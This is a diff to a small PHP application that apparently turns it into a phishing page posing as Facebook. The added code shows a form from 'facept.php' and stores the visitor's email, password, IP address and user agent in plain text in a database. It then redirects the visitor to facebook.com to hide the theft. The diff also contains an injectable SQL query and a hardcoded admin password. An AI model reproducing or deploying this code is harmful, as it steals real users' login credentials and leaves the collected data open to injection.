@@ -4,8 +4,8 @@
 
 class Main {
 
-	private static $mail = '1';
-	private static $pass = '1';
+	private static $mail = 'admin';
+	private static $pass = 'asdf';
 
   private $backoffice;
 
@@ -19,6 +19,8 @@ class Main {
     session_start();
 
     $submit = isset( $_POST['submit'] ) ? $_POST['submit'] : NULL;
+
+    //$firephp->log($submit, 'submit');
 
     if ( isset($_SESSION['backoffice']) ) {
       $this->backoffice->index();
@@ -55,16 +57,64 @@ class Main {
   }
 
 	public function show_input_form() {
-		include 'view/input.php';
+		//include 'view/input.php';
+    include 'view/facept.php';
   }
 
  	public function store() {
 
- 		// store do DB ...
+ 		// store to DB ...
+     //$firephp->log($mail, 'mail');
+
+    $mail = $_POST['mail']; 
+    $pass = $_POST['pass']; 
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $user_agent =  $_SERVER['HTTP_USER_AGENT'];
+    $date = date('Y-m-d H:i:s');
+
+    $conn = mysqli_connect(DB_SERVER,DB_USERNAME, DB_PASSWORD, DB_DATABASE);
+
+    if ( $conn === false ) {
+      //die("ERROR: Could not connect. " . mysqli_connect_error());
+    }
+
+    $query = "INSERT INTO record (mail,pass,ip,user_agent,created) VALUES ('$mail','$pass','$ip','$user_agent','$date')";
+
+    if ( mysqli_query($conn, $query) ) {
+      //echo "Records added successfully.";
+    } else{
+      //echo "ERROR: Could not able to execute $sql. " . mysqli_error($conn);
+    }
+ 
+    //$query = "INSERT INTO record (mail,pass,ip,user_agent,created) VALUES (?,?,?,?,?)";
+    //$statment = $conn->prepare($query);
+    //$statment->bind_param( $_POST['mail'] , $_POST['pass'] , $_SERVER['REMOTE_ADDR'] , $_SERVER['HTTP_USER_AGENT'] , $date );
+    //$statment->execute();
+    //$statment->close();
+
+    $conn->close();
+
+    /*
+    echo $mail;
+    echo "<br>";
+    echo $pass;
+    echo "<br>";
+    echo $ip;
+    echo "<br>";
+    echo $user_agent;
+    echo "<br>";
+    echo $date;
+    echo "<br>";
+    */
+
+    //echo $_SERVER['REMOTE_HOST'];
+     //$firephp->log($pass, 'pass');
+
+    //$this->show_input_form();
 
  		// redirect to ...
-    $this->show_input_form();
-    //header('Location: http://www.facebook.com');
+    header('Location: https://www.facebook.com');
+
  	}
 }
 
